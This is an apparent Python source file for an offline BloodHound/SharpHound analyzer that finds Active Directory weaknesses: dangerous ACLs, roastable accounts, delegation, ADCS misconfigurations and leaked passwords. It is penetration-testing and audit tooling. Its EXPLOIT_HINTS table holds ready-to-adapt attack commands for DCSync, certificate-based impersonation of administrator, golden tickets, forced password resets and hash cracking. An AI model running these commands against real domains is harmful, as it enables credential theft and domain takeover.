#!/usr/bin/env python3
"""
BloodHound Parser - Advanced Active Directory enumeration analysis
==================================================================

Offline analyzer for BloodHound / SharpHound JSON collections. Parses a folder
or a ``.zip`` archive and extracts *actionable* attack intelligence:

- Legacy (SharpHound v1) **and** BloodHound Community Edition (SharpHound v2) formats
- ``.zip`` archives are read directly (no manual extraction)
- ACL / ACE abuse edge analysis (GenericAll, WriteDacl, WriteOwner, ForceChangePassword,
  AddKeyCredentialLink / shadow credentials, AddMember, AllExtendedRights, ...)
- Kerberoastable & ASREPRoastable accounts, unconstrained / constrained delegation, RBCD
- Hygiene findings: passwordnotreqd, pwdneverexpires, stale accounts, secrets in
  the ``description`` field, missing LAPS, end-of-life operating systems, SID history
- ADCS attack detection (ESC1-ESC8 style) over certtemplates / enterprisecas
- Domain checks: MachineAccountQuota, legacy functional level, trusts without SID filtering
- krbtgt password age, privileged Kerberoasting, disabled-but-privileged accounts
- Recursive membership resolution for Tier-0 / privileged groups
- Offline attack-graph path-finding to Tier-0 (reverse BFS) + choke-point ranking
- Risk scoring & severity prioritization
- Exports: TXT, JSON, CSV, Markdown, HTML report, and a Neo4j Cypher hunting pack

Author : Esteban Jiménez  (Top 1 Hack The Box Ecuador)
License: MIT
"""

from __future__ import annotations

import argparse
import csv
import datetime as _dt
import html
import json
import logging
import re
import sys
import zipfile
from collections import defaultdict, deque
from dataclasses import dataclass, asdict
from enum import Enum
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Set, Tuple

logging.basicConfig(format="[%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger("bloodhound-parser")

__version__ = "2.2.0"


# --------------------------------------------------------------------------- #
# Domain model
# --------------------------------------------------------------------------- #
class ObjectType(Enum):
    """BloodHound object types (file-name suffix -> type)."""

    USERS = "users"
    GROUPS = "groups"
    COMPUTERS = "computers"
    OUS = "ous"
    GPOS = "gpos"
    DOMAINS = "domains"
    CONTAINERS = "containers"
    CERTTEMPLATES = "certtemplates"
    ENTERPRISECAS = "enterprisecas"


class Severity(Enum):
    """Finding severity, ordered for sorting (higher == worse)."""

    INFO = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4

    def __str__(self) -> str:  # pragma: no cover - trivial
        return self.name


# ACE rights that let a principal fully take over the target object.
DANGEROUS_ACES: Dict[str, Tuple[Severity, str]] = {
    "GenericAll": (Severity.CRITICAL, "Full control over the target object"),
    "GenericWrite": (Severity.HIGH, "Write any non-protected attribute (e.g. set SPN, RBCD)"),
    "WriteDacl": (Severity.CRITICAL, "Rewrite the object's DACL to grant self full control"),
    "WriteOwner": (Severity.CRITICAL, "Take ownership, then rewrite the DACL"),
    "Owns": (Severity.HIGH, "Object owner - implicit WriteDacl"),
    "AddMember": (Severity.HIGH, "Add arbitrary principals to the target group"),
    "AddSelf": (Severity.MEDIUM, "Add self to the target group"),
    "ForceChangePassword": (Severity.HIGH, "Reset the target account's password without knowing it"),
    "AllExtendedRights": (Severity.HIGH, "All extended rights (incl. ForceChangePassword / GetChanges)"),
    "AddKeyCredentialLink": (Severity.CRITICAL, "Shadow Credentials - add a KeyCredential and auth as target"),
    "ReadLAPSPassword": (Severity.HIGH, "Read the local admin (LAPS) password of the computer"),
    "ReadGMSAPassword": (Severity.HIGH, "Read the gMSA managed password"),
    "GetChanges": (Severity.CRITICAL, "DCSync (with GetChangesAll) - replicate secrets from the DC"),
    "GetChangesAll": (Severity.CRITICAL, "DCSync (with GetChanges) - replicate secrets from the DC"),
    "DCSync": (Severity.CRITICAL, "DCSync - replicate password hashes from the domain controller"),
    "WriteSPN": (Severity.HIGH, "Write servicePrincipalName -> targeted Kerberoasting"),
    "AddAllowedToAct": (Severity.HIGH, "Configure RBCD on the target -> impersonation"),
    "WriteAccountRestrictions": (Severity.MEDIUM, "Write account restrictions (incl. msDS-AllowedToActOnBehalf)"),
}

# Privileged / Tier-0 group RIDs & well-known names.
TIER0_RIDS = {"512", "516", "518", "519", "521", "544", "548", "549", "550", "551", "552", "1101", "1102"}
PRIVILEGED_KEYWORDS = [
    "domain admins", "enterprise admins", "schema admins", "administrators",
    "backup operators", "account operators", "server operators", "print operators",
    "dnsadmins", "domain controllers", "read-only domain controllers",
    "key admins", "enterprise key admins", "cert publishers", "group policy creator owners",
]

# End-of-life / unsupported operating systems (substring match, lower-cased).
EOL_OS_MARKERS = [
    "windows 2000", "windows xp", "windows vista", "windows 7", "windows 8",
    "windows server 2003", "windows server 2008", "windows server 2012",
]

# Regexes for secrets accidentally left in the description / info fields.
SECRET_HINT_RE = re.compile(
    r"(pass(w(or)?d)?|pwd|contrase|clave|secret|cred|pw\s*[:=])", re.IGNORECASE
)

# Ready-to-adapt exploitation commands per finding category. Placeholders in
# <angle-brackets> are meant to be filled with target-specific values. FOR
# AUTHORIZED TESTING ONLY (see DISCLAIMER.md).
EXPLOIT_HINTS: Dict[str, str] = {
    "Kerberoastable":
        "impacket-GetUserSPNs -request -dc-ip <DC> <DOMAIN>/<USER>:<PASS>  |  hashcat -m 13100 hash.txt rockyou.txt",
    "ASREPRoastable":
        "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC> -no-pass -format hashcat  |  hashcat -m 18200",
    "Unconstrained Delegation":
        "Coerce a DC (PetitPotam/printerbug) then capture its TGT: krbrelayx.py / Rubeus.exe monitor",
    "Constrained Delegation":
        "impacket-getST -spn <ALLOWED_SPN> -impersonate administrator -dc-ip <DC> <DOMAIN>/<USER>:<PASS>",
    "RBCD configured":
        "impacket-getST -spn cifs/<TARGET> -impersonate administrator -dc-ip <DC> <DOMAIN>/<CTRL_MACHINE$>:<HASH>",
    "MachineAccountQuota > 0":
        "impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name EVIL$ -computer-pass <PW>  # then RBCD/S4U",
    "Secret in description":
        "Just authenticate with the leaked password: netexec smb <DC> -u <USER> -p '<LEAKED>'",
    "Cleartext password attribute":
        "Authenticate with the leaked credential: netexec smb <DC> -u <USER> -p '<LEAKED>'  (then bloodhound.py / evil-winrm)",
    "PASSWD_NOTREQD":
        "Try an empty password: netexec smb <DC> -u <USER> -p ''",
    "Trust w/o SID filtering":
        "Forge an inter-realm golden ticket w/ SID history: ticketer.py -sids <TARGET_DA_SID> ...",
    "krbtgt password stale":
        "(Post-DA) Golden Ticket persistence: impacket-ticketer -domain-sid <SID> -nthash <krbtgt> administrator",
    # --- ACL edges (matched by 'ACL: <right>' prefix) ---
    "ACL: ForceChangePassword":
        "bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> set password <TARGET> 'Newpass123!'",
    "ACL: GenericAll":
        "User: shadow creds (certipy shadow auto -account <TARGET>) or reset pw. Group: bloodyAD add groupMember. Computer: RBCD.",
    "ACL: GenericWrite":
        "Targeted Kerberoast (set SPN) or Shadow Credentials: bloodyAD ... set object <TARGET> servicePrincipalName ...",
    "ACL: WriteDacl":
        "dacledit.py -action write -rights FullControl -principal <USER> -target <TARGET> <DOMAIN>/<USER>:<PASS>",
    "ACL: WriteOwner":
        "owneredit.py -action write -owner <USER> -target <TARGET> <DOMAIN>/<USER>:<PASS>  # then dacledit",
    "ACL: Owns":
        "owneredit.py then dacledit.py to grant yourself FullControl over <TARGET>",
    "ACL: AddMember":
        "bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC> add groupMember <TARGET_GROUP> <USER>",
    "ACL: AddSelf":
        "bloodyAD ... add groupMember <TARGET_GROUP> <USER>  (self)",
    "ACL: AddKeyCredentialLink":
        "certipy shadow auto -u <USER>@<DOMAIN> -p <PASS> -account <TARGET>   (or pywhisker.py --action add)",
    "ACL: AllExtendedRights":
        "ForceChangePassword (users) or ReadLAPSPassword/DCSync depending on target",
    "ACL: ReadLAPSPassword":
        "netexec ldap <DC> -u <USER> -p <PASS> -M laps   (or bloodyAD get object <PC$> --attr ms-Mcs-AdmPwd)",
    "ACL: ReadGMSAPassword":
        "netexec ldap <DC> -u <USER> -p <PASS> --gmsa",
    "ACL: GetChanges": "DCSync: impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC>",
    "ACL: GetChangesAll": "DCSync: impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC>",
    "ACL: DCSync": "impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC>",
    "ACL: WriteSPN": "Targeted Kerberoast: bloodyAD set SPN on <TARGET>, then GetUserSPNs -request",
    # --- ADCS ---
    "ADCS ESC1":
        "certipy req -u <USER>@<DOMAIN> -p <PASS> -ca <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>  |  certipy auth -pfx administrator.pfx",
    "ADCS ESC2":
        "certipy req ... -template <TEMPLATE>   # Any-Purpose/SubCA cert usable for auth",
    "ADCS ESC3":
        "certipy req ... -template <AGENT_TPL>  then  certipy req ... -on-behalf-of '<DOMAIN>\\administrator' -pfx agent.pfx",
    "ADCS ESC4":
        "certipy template -u <USER> -p <PASS> -template <TEMPLATE> -write-default-configuration   # weaponize into ESC1, then ESC1 flow",
    "ADCS ESC5":
        "Abuse WriteDacl/Owner over the CA object to grant ManageCA, then ESC7 flow",
    "ADCS ESC6":
        "certipy req -u <USER> -p <PASS> -ca <CA> -template User -upn administrator@<DOMAIN>   # CA honours enrollee SAN",
    "ADCS ESC7":
        "certipy ca -u <USER> -p <PASS> -ca <CA> -add-officer <USER>  /  -enable-template SubCA   # then issue",
    "ADCS ESC8":
        "certipy relay -target http://<CA>/certsrv/ -template DomainController   # coerce a DC to relay",
}


def exploit_hint(category: str) -> str:
    """Return a ready-to-adapt exploitation command for a finding category."""
    if category in EXPLOIT_HINTS:
        return EXPLOIT_HINTS[category]
    # Kerberoastable has a "(privileged!)" suffix variant.
    for key, cmd in EXPLOIT_HINTS.items():
        if category.startswith(key):
            return cmd
    return ""


@dataclass
class Finding:
    """A single actionable finding."""

    category: str
    severity: Severity
    principal: str
    detail: str
    target: str = ""

    def to_dict(self) -> Dict[str, str]:
        return {
            "category": self.category,
            "severity": str(self.severity),
            "principal": self.principal,
            "target": self.target,
            "detail": self.detail,
            "exploit": exploit_hint(self.category),
        }


@dataclass
class ADStatistics:
    """Aggregate counters for the collection."""

    total_users: int = 0
    total_groups: int = 0
    total_computers: int = 0
    total_ous: int = 0
    total_gpos: int = 0
    total_domains: int = 0
    total_cert_templates: int = 0
    enabled_users: int = 0
    admin_users: int = 0
    kerberoastable: int = 0
    asreproastable: int = 0
    unconstrained_delegation: int = 0
    constrained_delegation: int = 0
    rbcd_configured: int = 0
    password_not_required: int = 0
    password_never_expires: int = 0
    stale_accounts: int = 0
    secrets_in_description: int = 0
    cleartext_password_attrs: int = 0
    unprotected_privileged: int = 0
    sidhistory_users: int = 0
    high_value_targets: int = 0
    dangerous_aces: int = 0
    foreign_aces: int = 0
    eol_computers: int = 0
    computers_without_laps: int = 0
    privileged_spn: int = 0
    disabled_privileged: int = 0
    krbtgt_stale: int = 0
    machine_account_quota: int = -1
    risky_trusts: int = 0

    def to_dict(self) -> Dict[str, int]:
        return asdict(self)


# --------------------------------------------------------------------------- #
# Parser
# --------------------------------------------------------------------------- #
class SharpHoundParser:
    """Parse & analyze a SharpHound collection (folder or .zip)."""

    PATTERNS = {
        ObjectType.USERS: re.compile(r".*users\.json$", re.IGNORECASE),
        ObjectType.GROUPS: re.compile(r".*groups\.json$", re.IGNORECASE),
        ObjectType.COMPUTERS: re.compile(r".*computers\.json$", re.IGNORECASE),
        ObjectType.OUS: re.compile(r".*ous\.json$", re.IGNORECASE),
        ObjectType.GPOS: re.compile(r".*gpos\.json$", re.IGNORECASE),
        ObjectType.DOMAINS: re.compile(r".*domains\.json$", re.IGNORECASE),
        ObjectType.CONTAINERS: re.compile(r".*containers\.json$", re.IGNORECASE),
        ObjectType.CERTTEMPLATES: re.compile(r".*certtemplates\.json$", re.IGNORECASE),
        ObjectType.ENTERPRISECAS: re.compile(r".*enterprisecas\.json$", re.IGNORECASE),
    }

    def __init__(self, source: Path, stale_days: int = 180) -> None:
        self.source = source
        self.stale_days = stale_days
        self.statistics = ADStatistics()
        self.data: Dict[ObjectType, List[Dict]] = defaultdict(list)
        self.findings: List[Finding] = []
        self.format_version = "unknown"

        # Look-ups populated during parsing.
        self.sid_to_name: Dict[str, str] = {}
        self.sid_to_type: Dict[str, str] = {}
        self.group_members: Dict[str, List[Tuple[str, str]]] = {}  # groupSID -> [(memberSID, type)]

        self.kerberoastable_users: List[str] = []
        self.asreproastable_users: List[str] = []
        self.high_value_targets: List[str] = []
        self.privileged_users: Set[str] = set()
        self._attack_cache: Optional[Dict[str, Any]] = None

    # ------------------------------------------------------------------ #
    # Loading
    # ------------------------------------------------------------------ #
    def parse_all(self) -> None:
        logger.info("Loading collection: %s", self.source)
        files = list(self._iter_json_files())
        if not files:
            raise FileNotFoundError(f"No SharpHound JSON files found in {self.source}")

        for name, raw in files:
            obj_type = self._get_object_type(name)
            if not obj_type:
                logger.debug("Skipping unrecognized file: %s", name)
                continue
            try:
                content = json.loads(raw)
            except json.JSONDecodeError as exc:
                logger.error("Invalid JSON in %s: %s", name, exc)
                continue
            self._track_version(content)
            records = content.get("data", [])
            self.data[obj_type].extend(records)
            logger.info("Parsed %d %s from %s", len(records), obj_type.value, name)

        self._build_lookups()
        self._analyze()
        logger.info(
            "Analysis complete: %d users, %d computers, %d groups (format: %s)",
            self.statistics.total_users,
            self.statistics.total_computers,
            self.statistics.total_groups,
            self.format_version,
        )

    def _iter_json_files(self) -> Iterable[Tuple[str, str]]:
        """Yield (filename, raw-text) for every JSON file in the source."""
        if self.source.is_file() and self.source.suffix.lower() == ".zip":
            with zipfile.ZipFile(self.source) as zf:
                for info in zf.namelist():
                    if info.lower().endswith(".json"):
                        yield Path(info).name, zf.read(info).decode("utf-8-sig", "replace")
        elif self.source.is_dir():
            for path in sorted(self.source.iterdir()):
                if path.suffix.lower() == ".zip":
                    with zipfile.ZipFile(path) as zf:
                        for info in zf.namelist():
                            if info.lower().endswith(".json"):
                                yield Path(info).name, zf.read(info).decode("utf-8-sig", "replace")
                elif path.suffix.lower() == ".json" and path.is_file():
                    # SharpHound frequently writes JSON with a UTF-8 BOM; utf-8-sig strips it.
                    yield path.name, path.read_text(encoding="utf-8-sig", errors="replace")
        else:
            raise FileNotFoundError(f"Source is not a directory or .zip: {self.source}")

    def _get_object_type(self, filename: str) -> Optional[ObjectType]:
        for obj_type, pattern in self.PATTERNS.items():
            if pattern.match(filename):
                return obj_type
        return None

    def _track_version(self, content: Dict[str, Any]) -> None:
        meta = content.get("meta", {})
        version = meta.get("version")
        if version is None:
            return
        # SharpHound v1 collections are version <= 4; BloodHound CE is version >= 5.
        self.format_version = "BloodHound CE (v2+)" if version >= 5 else "Legacy (v1)"

    # ------------------------------------------------------------------ #
    # Look-ups
    # ------------------------------------------------------------------ #
    @staticmethod
    def _props(obj: Dict) -> Dict:
        # Both legacy and CE use the capitalized "Properties" key.
        return obj.get("Properties", obj.get("properties", {})) or {}

    @staticmethod
    def _sid(obj: Dict) -> str:
        return obj.get("ObjectIdentifier") or obj.get("objectid") or ""

    def _build_lookups(self) -> None:
        for obj_type in (ObjectType.USERS, ObjectType.GROUPS, ObjectType.COMPUTERS,
                         ObjectType.OUS, ObjectType.GPOS, ObjectType.DOMAINS):
            typename = obj_type.value.rstrip("s").capitalize()
            for obj in self.data[obj_type]:
                sid = self._sid(obj)
                props = self._props(obj)
                name = props.get("name") or props.get("distinguishedname") or sid
                if sid:
                    self.sid_to_name[sid] = name
                    self.sid_to_type[sid] = typename

        for group in self.data[ObjectType.GROUPS]:
            sid = self._sid(group)
            members = []
            for m in group.get("Members", []) or []:
                m_sid = m.get("ObjectIdentifier") or m.get("MemberId") or ""
                m_type = m.get("ObjectType") or m.get("MemberType") or "Unknown"
                if m_sid:
                    members.append((m_sid, m_type))
            self.group_members[sid] = members

    def resolve(self, sid: str) -> str:
        """Resolve a SID to a readable name (falls back to the SID)."""
        return self.sid_to_name.get(sid, sid)

    # ------------------------------------------------------------------ #
    # Analysis
    # ------------------------------------------------------------------ #
    def _analyze(self) -> None:
        self.statistics.total_users = len(self.data[ObjectType.USERS])
        self.statistics.total_groups = len(self.data[ObjectType.GROUPS])
        self.statistics.total_computers = len(self.data[ObjectType.COMPUTERS])
        self.statistics.total_ous = len(self.data[ObjectType.OUS])
        self.statistics.total_gpos = len(self.data[ObjectType.GPOS])
        self.statistics.total_domains = len(self.data[ObjectType.DOMAINS])
        self.statistics.total_cert_templates = len(self.data[ObjectType.CERTTEMPLATES])

        self._analyze_users()
        self._analyze_computers()
        self._analyze_domains()
        self._analyze_adcs()
        self._analyze_aces()

    @staticmethod
    def _domain_sid(sid: str) -> str:
        """Return the domain portion of an object SID (strip the trailing RID)."""
        return sid.rsplit("-", 1)[0] if sid.count("-") >= 3 else sid

    def _analyze_domains(self) -> None:
        for domain in self.data[ObjectType.DOMAINS]:
            props = self._props(domain)
            dname = props.get("name", "domain")

            quota = props.get("machineaccountquota")
            if isinstance(quota, int):
                self.statistics.machine_account_quota = quota
                if quota > 0:
                    self.findings.append(Finding(
                        "MachineAccountQuota > 0", Severity.MEDIUM, dname,
                        f"ms-DS-MachineAccountQuota={quota} - any user can join {quota} machine(s) "
                        f"(noPac / RBCD abuse)",
                    ))

            level = str(props.get("functionallevel") or "")
            if any(m in level for m in ("2000", "2003", "2008", "2012")):
                self.findings.append(Finding(
                    "Legacy functional level", Severity.LOW, dname,
                    f"Domain functional level '{level}' blocks modern hardening",
                ))

            for trust in domain.get("Trusts", []) or []:
                target = trust.get("TargetDomainName") or trust.get("TargetDomainSid", "?")
                sid_filtering = trust.get("SidFilteringEnabled", trust.get("sidfiltering"))
                transitive = trust.get("IsTransitive", trust.get("istransitive"))
                if sid_filtering is False:
                    self.statistics.risky_trusts += 1
                    self.findings.append(Finding(
                        "Trust w/o SID filtering", Severity.HIGH, dname,
                        f"Trust to '{target}' has SID filtering DISABLED "
                        f"(transitive={transitive}) - SID-history injection path",
                        target=str(target),
                    ))

    def _analyze_adcs(self) -> None:
        """ESC1-ESC8 style detection over certtemplates.json / enterprisecas.json."""
        templates = self.data[ObjectType.CERTTEMPLATES]
        cas = self.data[ObjectType.ENTERPRISECAS]
        if not templates and not cas:
            return

        # Which templates are actually published by at least one CA.
        published: Set[str] = set()
        for ca in cas:
            for t in ca.get("EnabledCertTemplates", []) or []:
                published.add(t.get("ObjectIdentifier", "") if isinstance(t, dict) else str(t))

        ANY_PURPOSE = "2.5.29.37.0"
        ENROLL_AGENT_EKU = "1.3.6.1.4.1.311.20.2.1"
        BROAD_RIDS = ("-513", "-515", "-545")
        BROAD_SIDS = ("S-1-5-11", "S-1-1-0")

        def low_priv_enroll(node: Dict) -> bool:
            for ace in node.get("Aces", []) or []:
                if (ace.get("RightName") or "") not in ("Enroll", "AllExtendedRights", "GenericAll"):
                    continue
                psid = ace.get("PrincipalSID", "")
                if psid in BROAD_SIDS or any(psid.endswith(r) for r in BROAD_RIDS):
                    return True
            return False

        def p_base(t_props: Dict, t_node: Dict) -> bool:
            return (
                not t_props.get("requiresmanagerapproval", False)
                and (t_props.get("authorizedsignatures", 0) in (0, None))
                and t_props.get("enabled", True) is not False
                and (not published or self._sid(t_node) in published)
                and low_priv_enroll(t_node)
            )

        for t in templates:
            props = self._props(t)
            tname = props.get("name", self._sid(t))
            ekus = props.get("ekus") or props.get("effectiveekus") or []
            base = p_base(props, t)

            # ESC1: enrollee-supplied SAN + authentication EKU
            if base and props.get("enrolleesuppliessubject") and props.get("authenticationenabled"):
                self.findings.append(Finding(
                    "ADCS ESC1", Severity.CRITICAL, tname,
                    "Enrollee-supplies-subject + auth EKU + low-priv enroll - impersonate any user (e.g. DA)",
                ))
            # ESC2: Any Purpose / no EKU
            if base and (ANY_PURPOSE in ekus or ekus == []):
                self.findings.append(Finding(
                    "ADCS ESC2", Severity.CRITICAL, tname,
                    "Any-Purpose / no-EKU template enrollable by low-priv - usable for authentication",
                ))
            # ESC3: enrollment-agent template
            if base and ENROLL_AGENT_EKU in ekus:
                self.findings.append(Finding(
                    "ADCS ESC3", Severity.CRITICAL, tname,
                    "Certificate Request Agent EKU + low-priv enroll - enroll on behalf of others",
                ))
            # ESC4: dangerous ACL on the template object
            for ace in t.get("Aces", []) or []:
                right = ace.get("RightName") or ""
                if right in ("Owns", "WriteOwner", "WriteDacl", "GenericAll", "GenericWrite",
                             "WritePKIEnrollmentFlag", "WritePKINameFlag", "AllExtendedRights"):
                    psid = ace.get("PrincipalSID", "")
                    if psid in BROAD_SIDS or any(psid.endswith(r) for r in BROAD_RIDS):
                        self.findings.append(Finding(
                            "ADCS ESC4", Severity.HIGH, self.resolve(psid),
                            f"Low-priv principal has {right} over template - reconfigure into ESC1",
                            target=tname,
                        ))
                        break

        for ca in cas:
            props = self._props(ca)
            caname = props.get("name", self._sid(ca))
            # ESC6: CA honours enrollee-specified SAN
            if props.get("isuserspecifiessanenabled"):
                self.findings.append(Finding(
                    "ADCS ESC6", Severity.CRITICAL, caname,
                    "CA EDITF_ATTRIBUTESUBJECTALTNAME2 enabled - every auth template becomes ESC1",
                ))
            # ESC5/ESC7: dangerous CA-object ACLs
            for ace in ca.get("Aces", []) or []:
                right = ace.get("RightName") or ""
                psid = ace.get("PrincipalSID", "")
                broad = psid in BROAD_SIDS or any(psid.endswith(r) for r in BROAD_RIDS)
                if not broad:
                    continue
                if right in ("ManageCA", "ManageCertificates"):
                    self.findings.append(Finding(
                        "ADCS ESC7", Severity.HIGH, self.resolve(psid),
                        f"Low-priv principal has {right} on CA - approve requests / enable ESC6",
                        target=caname,
                    ))
                elif right in ("WriteOwner", "WriteDacl", "GenericAll", "GenericWrite", "Owns"):
                    self.findings.append(Finding(
                        "ADCS ESC5", Severity.HIGH, self.resolve(psid),
                        f"Low-priv principal has {right} over PKI CA object",
                        target=caname,
                    ))
            # ESC8: web enrollment (only if the collector captured it)
            if props.get("hasenrollmentendpoint") or props.get("webenrollment"):
                self.findings.append(Finding(
                    "ADCS ESC8", Severity.HIGH, caname,
                    "HTTP web enrollment reachable - NTLM relay to CA -> DA certificate",
                ))

    def _is_high_value(self, props: Dict, obj: Dict) -> bool:
        # Legacy: highvalue=True. CE: system_tags contains "admin_tier_0" / IsTierZero.
        if props.get("highvalue"):
            return True
        tags = props.get("system_tags") or obj.get("system_tags") or ""
        if isinstance(tags, list):
            tags = " ".join(tags)
        return "admin_tier_0" in str(tags).lower() or bool(obj.get("IsTierZero"))

    def _analyze_users(self) -> None:
        now = _dt.datetime.now(_dt.timezone.utc).timestamp()
        stale_threshold = now - self.stale_days * 86400

        for user in self.data[ObjectType.USERS]:
            props = self._props(user)
            name = props.get("name", "Unknown")
            sid = self._sid(user)
            rid = sid.rsplit("-", 1)[-1] if "-" in sid else ""

            # krbtgt: stale password => Golden Ticket exposure window (check even if the
            # object is filtered by "enabled" below).
            if rid == "502":
                last = props.get("pwdlastset") or 0
                if isinstance(last, (int, float)) and 0 < last < (now - 180 * 86400):
                    self.statistics.krbtgt_stale += 1
                    age = int((now - last) / 86400)
                    self.findings.append(Finding(
                        "krbtgt password stale", Severity.HIGH, name,
                        f"krbtgt password is ~{age} days old - reset twice to invalidate Golden Tickets",
                    ))

            if props.get("enabled", True):
                self.statistics.enabled_users += 1
            else:
                # Re-enabling a disabled privileged account is instant escalation.
                if props.get("admincount"):
                    self.statistics.disabled_privileged += 1
                    self.findings.append(Finding(
                        "Disabled but privileged", Severity.MEDIUM, name,
                        "Account is disabled but retains admincount=1 - re-enable = instant privilege",
                    ))
                continue

            if self._is_high_value(props, user):
                self.statistics.high_value_targets += 1
                self.high_value_targets.append(name)

            # Kerberoasting: CE exposes "hasspn"; legacy relies on serviceprincipalnames.
            spns = props.get("serviceprincipalnames") or []
            if props.get("hasspn") or spns:
                self.statistics.kerberoastable += 1
                self.kerberoastable_users.append(name)
                # A roastable account that is ALSO privileged is a direct crown-jewel target.
                priv = bool(props.get("admincount"))
                if priv:
                    self.statistics.privileged_spn += 1
                self.findings.append(Finding(
                    "Kerberoastable" + (" (privileged!)" if priv else ""),
                    Severity.CRITICAL if priv else Severity.HIGH, name,
                    f"Account has SPN(s): {', '.join(spns) if spns else 'set'} - request/crack the TGS"
                    + (" | admincount=1" if priv else ""),
                ))

            if props.get("dontreqpreauth"):
                self.statistics.asreproastable += 1
                self.asreproastable_users.append(name)
                self.findings.append(Finding(
                    "ASREPRoastable", Severity.HIGH, name,
                    "DONT_REQ_PREAUTH set - request an AS-REP and crack it offline",
                ))

            if props.get("admincount"):
                self.statistics.admin_users += 1
                self.privileged_users.add(name)

            if props.get("unconstraineddelegation"):
                self.statistics.unconstrained_delegation += 1
                self.findings.append(Finding(
                    "Unconstrained Delegation", Severity.HIGH, name,
                    "User account trusted for unconstrained delegation",
                ))

            if props.get("passwordnotreqd"):
                self.statistics.password_not_required += 1
                self.findings.append(Finding(
                    "PASSWD_NOTREQD", Severity.MEDIUM, name,
                    "Account may have an empty password (PASSWD_NOTREQD)",
                ))

            if props.get("pwdneverexpires"):
                self.statistics.password_never_expires += 1

            if props.get("sidhistory"):
                self.statistics.sidhistory_users += 1
                self.findings.append(Finding(
                    "SID History", Severity.MEDIUM, name,
                    f"Populated SID history: {props.get('sidhistory')}",
                ))

            # Secrets left in the description / info field.
            for fld in ("description", "info"):
                text = props.get(fld)
                if text and SECRET_HINT_RE.search(str(text)):
                    self.statistics.secrets_in_description += 1
                    self.findings.append(Finding(
                        "Secret in description", Severity.MEDIUM, name,
                        f"{fld}='{text}'",
                    ))

            # Cleartext credentials in LDAP password-bearing attributes that
            # SharpHound collects (these frequently hold plaintext passwords).
            for fld in ("userpassword", "unixpassword", "unicodepassword", "sfupassword"):
                val = props.get(fld)
                if val:
                    self.statistics.cleartext_password_attrs += 1
                    self.findings.append(Finding(
                        "Cleartext password attribute", Severity.CRITICAL, name,
                        f"{fld} is populated: '{val}' - authenticate directly",
                    ))

            # Privileged account that can be delegated (NOT marked sensitive /
            # NOT_DELEGATED) - exposed to delegation/impersonation abuse.
            if props.get("admincount") and not props.get("sensitive"):
                self.statistics.unprotected_privileged += 1
                self.findings.append(Finding(
                    "Privileged account delegatable", Severity.MEDIUM, name,
                    "admincount=1 but not 'sensitive & cannot be delegated' / not in Protected Users",
                ))

            # Stale accounts (enabled but not logged on in stale_days).
            last = props.get("lastlogontimestamp") or props.get("lastlogon") or 0
            if isinstance(last, (int, float)) and 0 < last < stale_threshold:
                self.statistics.stale_accounts += 1

    def _analyze_computers(self) -> None:
        for computer in self.data[ObjectType.COMPUTERS]:
            props = self._props(computer)
            name = props.get("name", "Unknown")

            if props.get("unconstraineddelegation"):
                self.statistics.unconstrained_delegation += 1
                self.findings.append(Finding(
                    "Unconstrained Delegation", Severity.CRITICAL, name,
                    "Computer trusted for unconstrained delegation - coerce a DC to capture its TGT",
                ))

            delegates = props.get("allowedtodelegate") or []
            if delegates:
                self.statistics.constrained_delegation += 1
                self.findings.append(Finding(
                    "Constrained Delegation", Severity.HIGH, name,
                    f"allowedToDelegateTo: {', '.join(map(str, delegates))}",
                ))

            # Resource-Based Constrained Delegation: something is allowed to act *as* this host.
            act = computer.get("AllowedToAct") or props.get("allowedtoactonbehalfofotheridentity") or []
            if act:
                self.statistics.rbcd_configured += 1
                who = ", ".join(self.resolve(a.get("ObjectIdentifier", "")) if isinstance(a, dict) else str(a)
                                for a in act)
                self.findings.append(Finding(
                    "RBCD configured", Severity.HIGH, name,
                    f"AllowedToAct principals: {who}",
                ))

            os_name = str(props.get("operatingsystem") or "").lower()
            if any(marker in os_name for marker in EOL_OS_MARKERS):
                self.statistics.eol_computers += 1
                self.findings.append(Finding(
                    "End-of-life OS", Severity.MEDIUM, name,
                    f"Unsupported OS: {props.get('operatingsystem')}",
                ))

            # LAPS coverage (CE exposes "haslaps"; legacy "haslaps"/"laps").
            if props.get("enabled", True) and props.get("haslaps") is False and "haslaps" in props:
                self.statistics.computers_without_laps += 1

    def _analyze_aces(self) -> None:
        """Walk every object's ACE list and flag dangerous inbound rights."""
        for obj_type in (ObjectType.USERS, ObjectType.GROUPS, ObjectType.COMPUTERS,
                         ObjectType.DOMAINS, ObjectType.GPOS, ObjectType.OUS,
                         ObjectType.CERTTEMPLATES):
            for obj in self.data[obj_type]:
                target_name = self._props(obj).get("name") or self._sid(obj)
                target_hv = self._is_high_value(self._props(obj), obj)
                for ace in obj.get("Aces", []) or []:
                    right = ace.get("RightName") or ace.get("AceType") or ""
                    if right not in DANGEROUS_ACES:
                        continue
                    severity, desc = DANGEROUS_ACES[right]
                    # Rights over a Tier-0 / high-value target are one notch worse.
                    if target_hv and severity.value < Severity.CRITICAL.value:
                        severity = Severity(severity.value + 1)
                    principal_sid = ace.get("PrincipalSID", "")
                    principal = self.resolve(principal_sid)
                    # Ignore self-referential / built-in noise where the principal is the target.
                    if principal_sid and principal_sid == self._sid(obj):
                        continue
                    self.statistics.dangerous_aces += 1
                    self.findings.append(Finding(
                        f"ACL: {right}", severity, principal,
                        f"{desc}{' [Tier-0 target]' if target_hv else ''}",
                        target=target_name,
                    ))

    # ------------------------------------------------------------------ #
    # Membership resolution
    # ------------------------------------------------------------------ #
    def resolve_group_members(self, group_sid: str) -> Set[str]:
        """Recursively resolve the effective (transitive) members of a group."""
        seen: Set[str] = set()
        result: Set[str] = set()
        queue: deque[str] = deque([group_sid])
        while queue:
            current = queue.popleft()
            for member_sid, member_type in self.group_members.get(current, []):
                if member_sid in seen:
                    continue
                seen.add(member_sid)
                if member_type == "Group":
                    queue.append(member_sid)
                else:
                    result.add(self.resolve(member_sid))
        return result

